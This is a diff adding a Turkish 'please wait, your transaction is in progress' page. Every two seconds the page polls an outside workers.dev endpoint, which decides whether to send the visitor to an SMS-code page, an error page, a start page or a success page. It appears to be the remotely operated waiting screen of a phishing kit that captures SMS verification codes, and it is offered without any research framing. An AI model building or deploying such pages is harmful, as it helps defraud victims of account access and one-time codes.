@@ -1,0 +1,88 @@
+ 
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#dc0004">
+    <title>x</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css"> 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+</head>
+
+<body>
+ 
+    <div id="slider"> 
+ 
+        <div class="gray7 slide active" style="background-color: rgb(241, 241, 241);">
+            <div id="call" style="margin-top: 20%;width: 90%;display: inline-block;">
+                <img src="static/an.svg" width="220" height="200">
+                <p id="countdown2" style="font-size: 18px; color: #7d7c7c; margin-top: 5%; font-weight: 500;">İşleminiz
+                    Devam Ediyor Lütfen Bekleyiniz.</p>
+            </div>
+
+            <!-- Yeni Buton -->
+
+        </div> 
+    </div>
+
+    <script>
+        function isJSON(data) {
+            if (typeof data !== "string") {
+                return false;
+            }
+
+            try {
+                JSON.parse(data);
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function promo() {
+            var data = new FormData();
+            data.append('action', "redirect");
+            fetch('https://curly-fire-5ecb.aisik3516.workers.dev/', {
+                method: 'POST',
+                body: data,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.page == "sms1") {
+                        window.location.href = "sms.html";
+                    } else if (data.page == "sms2") {
+                        window.location.href = "hatali.html";
+                    } else if (data.page == "basadondur") {
+                        window.location.href = "index.html";
+                    } else if (data.page == "tebrik") {
+                        window.location.href = "basarili.html";
+                    }
+                })
+                .catch(error => {
+                    console.error('Hata:', error);
+                });
+        }
+
+        $(document).ready(function () {
+
+            promo();
+
+            setInterval(promo, 2000);
+        });
+    </script>
+    <script src="script.js?v=1.1.2"></script>
+
+
+
+</body>
+
+</html>
